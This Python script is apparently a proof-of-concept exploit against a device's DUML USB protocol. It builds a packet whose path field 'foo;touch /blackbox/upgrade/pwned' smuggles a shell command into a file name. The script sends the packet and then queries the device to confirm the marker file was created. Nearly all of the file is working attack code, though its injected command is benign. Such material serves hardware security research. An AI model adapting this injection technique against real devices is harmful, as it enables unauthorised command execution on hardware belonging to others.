import os
import sys, time, struct
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import n3_file as N

PATH = 'foo;touch /blackbox/upgrade/pwned'
pay = bytes([0x01, 0x02, 0x00, len(PATH)]) + PATH.encode() + b'\x00'
print('payload len', len(pay), pay.hex())

d = N.Duml()
d.open()
try:
    d.drain(200)
    f = N.pkt(0x0A, 0x5D, 0x8300, 0x19, 0x31, pay, 0x40)
    rc = d.lib.dll.usb_bulk_write(d.h, d.eo, f, len(f), 800)
    print('write rc', rc)
    out = []

    def on(fr):
        b = N.body_of(fr)
        if not b or len(b) < 7:
            return
        if b[5] == 0x19 and b[6] == 0x31:
            out.append((b[4], b[7:]))
    d.drain(2500, on)
    for ack, pl in out:
        print('reply ack=%02x len=%d %s' % (ack, len(pl), pl[:80].hex()))
    if not out:
        print('(no reply)')
finally:
    d.close()

# verify the marker over 0x5D
d = N.Duml()
d.open()
try:
    f = N.pkt(0x0A, 0x5D, 0x7000, 0, 0xEA, bytes([0x0A, 0x01, 0x01]))
    d.lib.dll.usb_bulk_write(d.h, d.eo, f, len(f), 500)
    time.sleep(0.25)
    d.drain(400)
    res = {'status': None, 'meta': None, 'chunks': {}}

    def on(fr):
        b = N.body_of(fr)
        if not b or len(b) < 7:
            return
        sp, dd, sq, ack, cs, cid = b[0], b[1], b[2] | (b[3] << 8), b[4], b[5], b[6]
        pl = b[7:]
        if cs != 0 or cid != 0x2A:
            return
        if ack == 0xC0 and len(pl) == 1:
            res['status'] = pl[0]
        elif ack == 0x40 and pl and pl[0] == 1 and len(pl) >= 8:
            res['meta'] = (struct.unpack_from('<I', pl, 1)[0], pl[6:6 + pl[5]].split(b'\0')[0].decode('latin1', 'replace'))
        elif ack == 0x40 and pl and pl[0] == 4:
            res['chunks'][struct.unpack_from('<I', pl, 1)[0]] = pl[5:]

    pb = b'/blackbox/upgrade/pwned'
    payload = bytes([0x08, len(pb)]) + pb + bytes([0x09, 0x01, 0x04])
    f = N.pkt(0x0A, 0x5D, 0x7100, 0, 0x2A, payload)
    d.lib.dll.usb_bulk_write(d.h, d.eo, f, len(f), 500)
    d.drain(2500, on)
    print('marker status=%s meta=%s chunks=%d' % (
        None if res['status'] is None else hex(res['status']), res['meta'], len(res['chunks'])))
finally:
    d.close()
